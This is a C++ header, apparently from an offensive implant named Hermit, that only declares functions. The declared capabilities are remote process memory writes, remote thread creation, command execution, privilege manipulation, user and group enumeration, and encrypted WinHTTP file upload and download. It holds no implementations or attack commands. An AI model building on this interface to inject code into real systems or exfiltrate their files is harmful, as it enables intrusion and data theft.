#ifndef HERMIT_CORE_SYSTEM_HPP
#define HERMIT_CORE_SYSTEM_HPP

#include "core/state.hpp"
#include "core/procs.hpp"
#include "core/stdout.hpp"
#include "core/utils.hpp"

#include <windows.h>
#include <winhttp.h>
#include <winreg.h>
#include <fstream>
#include <lm.h>
#include <map>
#include <sddl.h>
#include <string>
#include <strsafe.h>
#include <synchapi.h>
#include <vector>

#define INFO_BUFFER_SIZE 32767

namespace System::Arch
{
    std::wstring GetName(WORD wProcessorArchitecture);
}

namespace System::Env
{
    std::wstring GetStrings(
        Procs::PPROCS       pProcs,
        const std::wstring& envVar
    );
    std::map<std::wstring, std::wstring> GetAll(Procs::PPROCS pProcs);
}

namespace System::Group
{
    std::vector<std::wstring> GetAllGroups();
}

namespace System::User
{
    std::wstring GetAccountName(); // retrieves computer name and username.
    std::wstring GetSID();
    std::vector<std::wstring> GetAllUsers();
}

namespace System::Priv
{
    BOOL CheckPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege);
    BOOL SetPrivilege(
        HANDLE hToken,
        LPCTSTR lpszPrivilege,
        BOOL bEnablePrivilege
    );
}

namespace System::Handle
{
    BOOL SetHandleInformation(
        Procs::PPROCS   pProcs,
        HANDLE          hObject,
        DWORD           dwMask,
        DWORD           dwFlags
    );
}

namespace System::Process
{
    HANDLE ProcessCreate(
        Procs::PPROCS   pProcs,
        LPCWSTR         lpApplicationName,
        DWORD           dwDesiredAccess, // e.g. PROCESS_ALL_ACCESS
        HANDLE          hParentProcess
    );
    HANDLE ProcessOpen(
        Procs::PPROCS   pProcs,
        DWORD           dwProcessID,
        DWORD           dwDesiredAccess
    );
    BOOL ProcessTerminate(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        NTSTATUS        ntStatus
    );
    PVOID VirtualMemoryAllocate(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        DWORD           dwSize,
        DWORD           dwAllocationType,   // e.g. MEM_COMMIT | MEM_RESERVE
        DWORD           dwProtect           // e.g. PAGE_READWRITE
    );
    BOOL VirtualMemoryFree(
        Procs::PPROCS   pProcs,
        HANDLE 	        hProcess,
		PVOID* 	        lpBaseAddr,
		SIZE_T 	        dwSize,
		DWORD 	        dwFreeType
    );
    BOOL VirtualMemoryWrite(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        LPVOID          lpBaseAddr,
        LPVOID          lpBuffer,
		DWORD           dwBufferSize,
        PDWORD 			lpNumberOfBytesWritten
    );
    HANDLE RemoteThreadCreate(
        Procs::PPROCS           pProcs,
        HANDLE                  hProcess,
        LPTHREAD_START_ROUTINE 	lpThreadStartRoutineAddr,
        PVOID                   pArgument
    );

    std::wstring ExecuteCmd(
        Procs::PPROCS       pProcs,
        const std::wstring& wCmd
    );
    BOOL ExecuteFile(
        Procs::PPROCS       pProcs,
        const std::wstring& wFilePath
    );
}

namespace System::Pipe
{
    BOOL PipeCreate(
        Procs::PPROCS   pProcs,
        PHANDLE         phRead,
        PHANDLE         phWrite
    );
}

namespace System::Fs
{
    VOID CALLBACK FileIOCompletionRoutine(
        DWORD dwErrorCode,
        DWORD dwNumberOfBytesTransfered,
        LPOVERLAPPED lpOverlapped
    );

    std::wstring GetAbsolutePath(
        const std::wstring& wPath,
        BOOL bExtendLength
    );
    BOOL ChangeCurrentDirectory(
        Procs::PPROCS pProcs,
        const std::wstring& wDestPath
    );
    std::vector<std::wstring> GetFilesInDirectory(
        Procs::PPROCS pProcs,
        const std::wstring& wDirPath,
        BOOL bRecurse
    );
    HANDLE CreateNewDirectory(
        Procs::PPROCS pProcs,
        const std::wstring& wDirPath
    );
    HANDLE CreateNewFile(
        Procs::PPROCS pProcs,
        const std::wstring& wFilePath
    );
    std::vector<BYTE> ReadBytesFromFile(
        Procs::PPROCS pProcs,
        const std::wstring& wFilePath
    );
    BOOL WriteBytesToFile(
        Procs::PPROCS               pProcs,
        const std::wstring&         wFilePath,
        const std::vector<BYTE>&    bytes
    );
    DWORD FileSizeGet(
        Procs::PPROCS   pProcs,
        HANDLE          hFile
    );
}

namespace System::Http
{
    struct WinHttpHandlers {
        HINTERNET hSession;
        HINTERNET hConnect;
    };
    struct WinHttpResponse {
        BOOL bResult;
        HINTERNET hRequest;
        DWORD dwStatusCode;
    };

    WinHttpHandlers InitRequest(
		Procs::PPROCS pProcs,
		LPCWSTR lpHost,
		INTERNET_PORT nPort
	);
    WinHttpResponse SendRequest(
        Procs::PPROCS pProcs,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpMethod,
        LPCWSTR lpHeaders,
        LPVOID lpData,
        DWORD dwDataLength
    );
    std::vector<BYTE> ReadResponseBytes(
        Procs::PPROCS pProcs,
        HINTERNET hRequest
    );
    std::wstring ReadResponseText(
        Procs::PPROCS pProcs,
        HINTERNET hRequest
    );
    BOOL DownloadFile(
        Procs::PPROCS pProcs,
        Crypt::PCRYPT pCrypt,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpHeaders,
        const std::wstring& wSrc,
        const std::wstring& wDest
    );
    BOOL UploadFile(
        Procs::PPROCS pProcs,
        Crypt::PCRYPT pCrypt,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpHeaders,
        const std::wstring& wSrc
    );
    VOID WinHttpCloseHandles(
        Procs::PPROCS pProcs,
        HINTERNET hSession,
        HINTERNET hConnect,
        HINTERNET hRequest
    );
}

#endif // HERMIT_CORE_SYSTEM_HPP